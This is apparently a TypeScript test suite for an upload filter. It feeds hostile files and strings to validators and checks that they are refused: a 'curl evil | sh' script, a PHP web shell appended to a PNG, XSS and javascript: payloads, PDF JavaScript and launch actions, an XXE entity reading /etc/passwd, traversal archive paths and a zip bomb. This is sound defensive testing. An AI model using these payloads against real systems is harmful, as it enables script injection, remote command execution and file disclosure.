import './setup';
import test from 'node:test';
import assert from 'node:assert/strict';
import { inspectBuffer, sanitizeFilename, extensionOf } from '../src/utils/fileSignature';
import { validateSvg } from '../src/utils/svgGuard';
import { checkMediaUrl, collectMediaUrlErrors } from '../src/utils/mediaUrl';
import { blocksToHtml, safeUrl, Block } from '../src/utils/blocks';

/**
 * Upload admission tests.
 *
 * Every case here is a file an attacker would actually send. The point is not
 * that `inspectBuffer` returns a type — it is that the things which must never
 * be stored are refused, and the things editors upload every day still are.
 */

const OPTS = {
  zipMaxEntries: 512,
  zipMaxTotalUncompressedBytes: 128 * 1024 * 1024,
  zipMaxCompressionRatio: 200,
  rejectActivePdf: true,
};

/* ── fixture builders ───────────────────────────────────────────────────── */

/** A structurally valid PNG: signature, IHDR, IDAT, IEND. */
function png(extra: Buffer = Buffer.alloc(0)): Buffer {
  const chunk = (type: string, data: Buffer): Buffer => {
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    // The reader does not verify CRCs, so a placeholder keeps fixtures small.
    return Buffer.concat([len, Buffer.from(type, 'latin1'), data, Buffer.alloc(4)]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(1, 0);
  ihdr.writeUInt32BE(1, 4);
  ihdr[8] = 8;
  ihdr[9] = 6;
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', Buffer.alloc(32)),
    chunk('IEND', Buffer.alloc(0)),
    extra,
  ]);
}

/** A structurally valid JPEG: SOI, APP0, SOS, entropy data, EOI. */
function jpeg(extra: Buffer = Buffer.alloc(0)): Buffer {
  const app0 = Buffer.concat([
    Buffer.from([0xff, 0xe0, 0x00, 0x10]),
    Buffer.from('JFIF\0', 'latin1'),
    Buffer.alloc(9),
  ]);
  const sos = Buffer.from([0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00]);
  return Buffer.concat([
    Buffer.from([0xff, 0xd8]),
    app0,
    sos,
    Buffer.alloc(64, 0x42),
    Buffer.from([0xff, 0xd9]),
    extra,
  ]);
}

function gif(extra: Buffer = Buffer.alloc(0)): Buffer {
  return Buffer.concat([
    Buffer.from('GIF89a', 'latin1'),
    Buffer.from([0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00]),
    Buffer.alloc(16),
    Buffer.from([0x3b]),
    extra,
  ]);
}

function webp(extra: Buffer = Buffer.alloc(0)): Buffer {
  const payload = Buffer.concat([
    Buffer.from('WEBP', 'latin1'),
    Buffer.from('VP8 ', 'latin1'),
    Buffer.alloc(32),
  ]);
  const size = Buffer.alloc(4);
  size.writeUInt32LE(payload.length);
  return Buffer.concat([Buffer.from('RIFF', 'latin1'), size, payload, extra]);
}

function pdf(body = '1 0 obj\n<< /Type /Catalog >>\nendobj\n'): Buffer {
  return Buffer.from(`%PDF-1.7\n${body}/Root 1 0 R\nstartxref\n9\n%%EOF\n`, 'latin1');
}

/** Build a real ZIP archive (stored, no compression) from name → contents. */
function zip(
  entries: Array<{ name: string; data?: Buffer; uncompressedSize?: number; flags?: number }>,
  opts: { trailing?: Buffer } = {},
): Buffer {
  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const e of entries) {
    const data = e.data ?? Buffer.from('x', 'latin1');
    const name = Buffer.from(e.name, 'utf8');
    const uncompressed = e.uncompressedSize ?? data.length;
    const flags = e.flags ?? 0;

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(flags, 6);
    local.writeUInt16LE(0, 8); // stored
    local.writeUInt32LE(0, 14); // crc
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(uncompressed, 22);
    local.writeUInt16LE(name.length, 26);
    locals.push(Buffer.concat([local, name, data]));

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0);
    central.writeUInt16LE(20, 6);
    central.writeUInt16LE(flags, 8);
    central.writeUInt16LE(0, 10);
    central.writeUInt32LE(0, 16);
    central.writeUInt32LE(data.length, 20);
    central.writeUInt32LE(uncompressed, 24);
    central.writeUInt16LE(name.length, 28);
    central.writeUInt32LE(offset, 42);
    centrals.push(Buffer.concat([central, name]));

    offset += 30 + name.length + data.length;
  }

  const localBlock = Buffer.concat(locals);
  const centralBlock = Buffer.concat(centrals);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(centralBlock.length, 12);
  eocd.writeUInt32LE(localBlock.length, 16);

  return Buffer.concat([localBlock, centralBlock, eocd, opts.trailing ?? Buffer.alloc(0)]);
}

const DOCX_MIN = [
  { name: '[Content_Types].xml' },
  { name: '_rels/.rels' },
  { name: 'word/document.xml' },
];

const ok = (b: Buffer) => inspectBuffer(b, OPTS);
const reason = (b: Buffer): string => {
  const r = inspectBuffer(b, OPTS);
  return r.ok ? '' : r.reason;
};

/* ── legitimate files must still work ───────────────────────────────────── */

test('valid images and documents are accepted and identified from their bytes', () => {
  assert.equal(ok(png()).ok && ok(png()).ok, true);
  for (const [buf, id] of [
    [png(), 'png'],
    [jpeg(), 'jpeg'],
    [gif(), 'gif'],
    [webp(), 'webp'],
    [pdf(), 'pdf'],
    [zip(DOCX_MIN), 'docx'],
  ] as Array<[Buffer, string]>) {
    const result = inspectBuffer(buf, OPTS);
    assert.equal(result.ok, true, `${id} should be accepted: ${reason(buf)}`);
    if (result.ok) assert.equal(result.format.id, id);
  }
});

/* ── renamed executables and scripts ────────────────────────────────────── */

test('a renamed Windows executable is refused however it is labelled', () => {
  const exe = Buffer.concat([Buffer.from('MZ\x90\0', 'latin1'), Buffer.alloc(512, 0x41)]);
  const result = inspectBuffer(exe, OPTS);
  assert.equal(result.ok, false);
  assert.match(reason(exe), /executable/i);
});

test('ELF, Mach-O and shell scripts are refused', () => {
  const elf = Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(256)]);
  const macho = Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), Buffer.alloc(256)]);
  const sh = Buffer.from('#!/bin/sh\ncurl evil | sh\n'.padEnd(256, ' '), 'latin1');
  for (const buf of [elf, macho, sh]) {
    assert.equal(inspectBuffer(buf, OPTS).ok, false);
  }
});

test('an HTML page renamed to .png is refused', () => {
  const html = Buffer.from(
    '<!DOCTYPE html><html><body><script>alert(document.domain)</script></body></html>'.padEnd(
      256,
      ' ',
    ),
    'latin1',
  );
  const result = inspectBuffer(html, OPTS);
  assert.equal(result.ok, false);
  assert.match(reason(html), /markup|recognis/i);
});

/* ── polyglots and appended payloads ────────────────────────────────────── */

test('a GIF with an HTML payload appended is refused as a polyglot', () => {
  const polyglot = gif(Buffer.from('<script>alert(1)</script>'.padEnd(200, ' '), 'latin1'));
  assert.equal(inspectBuffer(polyglot, OPTS).ok, false);
});

test('data appended after the PNG IEND chunk is refused', () => {
  const buf = png(Buffer.from('<?php system($_GET[0]); ?>'.padEnd(200, ' '), 'latin1'));
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
  assert.match(reason(buf), /appended/i);
});

test('data appended after the JPEG EOI marker is refused', () => {
  const buf = jpeg(Buffer.alloc(400, 0x41));
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
  assert.match(reason(buf), /appended/i);
});

test('a ZIP archive appended to a WebP is refused', () => {
  const buf = webp(zip(DOCX_MIN));
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

/* ── corrupt, truncated and empty files ─────────────────────────────────── */

test('empty and truncated files are refused', () => {
  assert.equal(inspectBuffer(Buffer.alloc(0), OPTS).ok, false);
  // Signature only, no chunks.
  const stub = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  assert.equal(inspectBuffer(stub, OPTS).ok, false);
});

test('an invalid JPEG with no end-of-image marker is refused', () => {
  const buf = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(64)]);
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

test('a WebP whose RIFF size does not match the buffer is refused', () => {
  const buf = webp();
  buf.writeUInt32LE(4, 4); // shrink the declared size, leaving trailing bytes
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

test('a PNG with a bogus chunk length is refused rather than skipped over', () => {
  const buf = png();
  buf.writeUInt32BE(0x7ffffff0, 8); // IHDR length beyond the buffer
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

/* ── PDF ────────────────────────────────────────────────────────────────── */

test('a malformed PDF without an end-of-file marker is refused', () => {
  const buf = Buffer.from('%PDF-1.7\nnot really a pdf\n'.padEnd(256, ' '), 'latin1');
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

test('a file claiming to be a PDF with a bad version is refused', () => {
  const buf = Buffer.from('%PDF-9.9\n/Root 1 0 R\nstartxref\n%%EOF', 'latin1');
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

test('a PDF carrying JavaScript or a launch action is refused', () => {
  const js = pdf('1 0 obj\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj\n');
  assert.equal(inspectBuffer(js, OPTS).ok, false);
  const launch = pdf('1 0 obj\n<< /A << /S /Launch /F (cmd.exe) >> >>\nendobj\n');
  assert.equal(inspectBuffer(launch, OPTS).ok, false);
  // …and stays accepted when the operator opts out of that check.
  assert.equal(inspectBuffer(js, { ...OPTS, rejectActivePdf: false }).ok, true);
});

/* ── DOCX / ZIP ─────────────────────────────────────────────────────────── */

test('a ZIP that is not a Word document is refused', () => {
  assert.equal(inspectBuffer(zip([{ name: 'evil.exe' }]), OPTS).ok, false);
  // An xlsx has the OOXML marker but is not in scope.
  const xlsx = zip([{ name: '[Content_Types].xml' }, { name: 'xl/workbook.xml' }]);
  assert.equal(inspectBuffer(xlsx, OPTS).ok, false);
});

test('a macro-enabled Word document is refused', () => {
  const macro = zip([...DOCX_MIN, { name: 'word/vbaProject.bin' }]);
  const result = inspectBuffer(macro, OPTS);
  assert.equal(result.ok, false);
  assert.match(reason(macro), /macro/i);
});

test('a zip bomb is refused on its compression ratio', () => {
  const bomb = zip([
    ...DOCX_MIN,
    { name: 'word/media/big.bin', data: Buffer.alloc(64), uncompressedSize: 64 * 1024 * 1024 },
  ]);
  const result = inspectBuffer(bomb, OPTS);
  assert.equal(result.ok, false);
  assert.match(reason(bomb), /compression ratio|unreasonable size/i);
});

test('an archive entry with a traversal path is refused', () => {
  const evil = zip([...DOCX_MIN, { name: '../../etc/passwd' }]);
  assert.equal(inspectBuffer(evil, OPTS).ok, false);
  const absolute = zip([...DOCX_MIN, { name: '/etc/passwd' }]);
  assert.equal(inspectBuffer(absolute, OPTS).ok, false);
});

test('an encrypted archive is refused because its contents cannot be inspected', () => {
  const encrypted = zip([...DOCX_MIN, { name: 'word/secret.xml', flags: 0x0001 }]);
  assert.equal(inspectBuffer(encrypted, OPTS).ok, false);
});

test('data appended after the ZIP central directory is refused', () => {
  const buf = zip(DOCX_MIN, { trailing: Buffer.from('APPENDED-PAYLOAD', 'latin1') });
  assert.equal(inspectBuffer(buf, OPTS).ok, false);
});

test('too many archive entries is refused', () => {
  const many = Array.from({ length: 40 }, (_, i) => ({ name: `word/part${i}.xml` }));
  const buf = zip([...DOCX_MIN, ...many]);
  assert.equal(inspectBuffer(buf, { ...OPTS, zipMaxEntries: 10 }).ok, false);
  // The same archive is fine under the production ceiling.
  assert.equal(inspectBuffer(buf, OPTS).ok, true);
});

/* ── SVG ────────────────────────────────────────────────────────────────── */

const svg = (inner: string) =>
  Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">${inner}</svg>`, 'utf8');

test('SVG is detected as SVG rather than falling through to "unknown"', () => {
  const result = inspectBuffer(svg('<rect width="10" height="10"/>'), OPTS);
  assert.equal(result.ok, true);
  if (result.ok) assert.equal(result.format.id, 'svg');
});

test('a plain shape-only SVG passes the guard', () => {
  assert.equal(validateSvg(svg('<rect width="10" height="10" fill="#f00"/>')).ok, true);
});

test('every scripted SVG shape is refused', () => {
  const hostile = [
    '<script>alert(1)</script>',
    '<rect onload="alert(1)" width="1" height="1"/>',
    '<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)></body></foreignObject>',
    '<a href="javascript:alert(1)"><rect width="1" height="1"/></a>',
    '<image href="https://evil.test/x.png"/>',
    '<use href="https://evil.test/x.svg#a"/>',
    '<animate attributeName="href" to="javascript:alert(1)"/>',
    '<rect style="fill:url(https://evil.test/x)" width="1" height="1"/>',
    '<style>@import url(https://evil.test/x.css);</style>',
  ];
  for (const inner of hostile) {
    const verdict = validateSvg(svg(inner));
    assert.equal(verdict.ok, false, `should refuse: ${inner}`);
  }
});

test('SVG entity and DOCTYPE tricks are refused', () => {
  const xxe = Buffer.from(
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
    'utf8',
  );
  assert.equal(validateSvg(xxe).ok, false);
  const encoded = svg('<rect fill="&#106;avascript:alert(1)" width="1" height="1"/>');
  assert.equal(validateSvg(encoded).ok, false);
});

test('a scheme split by a control character is still caught', () => {
  const split = svg('<use href="jav\tascript:alert(1)"/>');
  assert.equal(validateSvg(split).ok, false);
});

/* ── filenames ──────────────────────────────────────────────────────────── */

test('filenames are stripped to something safe to store and display', () => {
  assert.equal(sanitizeFilename('../../../etc/passwd', 200), 'passwd');
  assert.equal(sanitizeFilename('..\\..\\windows\\system32\\cmd.exe', 200), 'cmd.exe');
  assert.equal(sanitizeFilename('photo.jpg', 200), 'photo.jpg');
  // Double extension, RTL override, control characters, NUL.
  assert.ok(!sanitizeFilename('invoice‮gpj.exe', 200).includes('‮'));
  assert.ok(!sanitizeFilename('a b.png', 200).includes(' '));
  // Never empty, never longer than the cap.
  assert.equal(sanitizeFilename('', 200), 'file');
  assert.equal(sanitizeFilename('***', 200), 'file');
  assert.ok(sanitizeFilename('a'.repeat(5000) + '.png', 200).length <= 200);
});

test('the extension helper reads the real trailing extension', () => {
  assert.equal(extensionOf('a/b/c.tar.gz'), 'gz');
  assert.equal(extensionOf('photo.JPG'), 'jpg');
  assert.equal(extensionOf('noextension'), '');
  assert.equal(extensionOf('.hidden'), '');
});

/* ── media URLs (the non-upload path into the same columns) ─────────────── */

test('media URL fields refuse executable and off-host values', () => {
  const bad = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '//evil.test/x.svg',
    'http://res.cloudinary.com/x.png',
    'https://evil.test/x.png',
    'https://user:pass@res.cloudinary.com/x.png',
    'https://res.cloudinary.com.evil.test/x.png',
    'java\nscript:alert(1)',
  ];
  for (const value of bad) {
    assert.equal(checkMediaUrl(value).ok, false, `should refuse: ${value}`);
  }
});

test('media URL fields still accept what the product actually stores', () => {
  const good = [
    '',
    undefined,
    '/images/logo.png',
    'https://res.cloudinary.com/demo/image/upload/v1/glorytecks/courses/abc.png',
  ];
  for (const value of good) {
    assert.equal(checkMediaUrl(value).ok, true, `should accept: ${String(value)}`);
  }
});

test('nested media URLs are found wherever the schema puts them', () => {
  const body = {
    title: 'Course',
    bannerImage: 'https://res.cloudinary.com/demo/a.png',
    brochureUrl: 'javascript:alert(1)',
    images: ['/ok.png', 'https://evil.test/x.png'],
    seo: { ogImage: 'data:text/html,<script>alert(1)</script>' },
    sections: [{ image: 'https://evil.test/y.png' }],
  };
  const errors = collectMediaUrlErrors(body);
  const fields = errors.map((e) => e.field).sort();
  assert.deepEqual(fields, ['brochureUrl', 'images[1]', 'sections[0].image', 'seo.ogImage']);
});

/* ── rendered blog HTML (uploaded URLs reaching the public site) ────────── */

test('block ids and code languages cannot break out of their attributes', () => {
  const blocks: Block[] = [
    { type: 'heading', id: 'x" onmouseover="alert(1)', text: 'Title' },
    { type: 'code', lang: 'js" onload="alert(1)', code: 'const a = 1;' },
  ];
  const html = blocksToHtml(blocks);
  assert.ok(!html.includes('onmouseover="alert(1)"'));
  assert.ok(!html.includes('onload="alert(1)"'));
  assert.ok(html.includes('&quot;'));
});

test('author-supplied links and image URLs cannot carry an executable scheme', () => {
  assert.equal(safeUrl('javascript:alert(1)'), '#');
  assert.equal(safeUrl('data:text/html,<script>alert(1)</script>'), '#');
  assert.equal(safeUrl('//evil.test/x'), '#');
  assert.equal(safeUrl('https://res.cloudinary.com/a.png'), 'https://res.cloudinary.com/a.png');
  assert.equal(safeUrl('/local/a.png'), '/local/a.png');

  const html = blocksToHtml([
    { type: 'paragraph', text: 'Click [here](javascript:alert(1)) now' },
    { type: 'image', url: 'javascript:alert(1)', alt: 'x' },
  ]);
  assert.ok(!html.includes('href="javascript:'));
  assert.ok(!html.includes('src="javascript:'));
});

test('the fields the server fetches are host-checked even when the relaxation is on', () => {
  // MEDIA_ALLOW_ANY_HTTPS_HOST only ever relaxes display fields. brochureUrl
  // and fileUrl feed the public brochure proxy's outbound request, so an
  // arbitrary host there stays an error whatever the setting says.
  const body = {
    brochureUrl: 'https://attacker.test/x.pdf',
    fileUrl: 'https://attacker.test/y.pdf',
    featuredImage: 'https://some-cdn.test/a.png',
  };
  const strict = collectMediaUrlErrors(body).map((e) => e.field).sort();
  assert.deepEqual(strict, ['brochureUrl', 'featuredImage', 'fileUrl']);

  process.env.MEDIA_ALLOW_ANY_HTTPS_HOST = 'true';
  try {
    const relaxed = collectMediaUrlErrors(body).map((e) => e.field).sort();
    assert.deepEqual(relaxed, ['brochureUrl', 'fileUrl']);
  } finally {
    process.env.MEDIA_ALLOW_ANY_HTTPS_HOST = '';
  }
});

test('the relaxation never re-admits an executable scheme', () => {
  process.env.MEDIA_ALLOW_ANY_HTTPS_HOST = 'true';
  try {
    for (const bad of ['javascript:alert(1)', 'data:text/html,x', '//evil.test/a', 'http://x/a']) {
      assert.equal(checkMediaUrl(bad).ok, false, `must still refuse: ${bad}`);
    }
  } finally {
    process.env.MEDIA_ALLOW_ANY_HTTPS_HOST = '';
  }
});
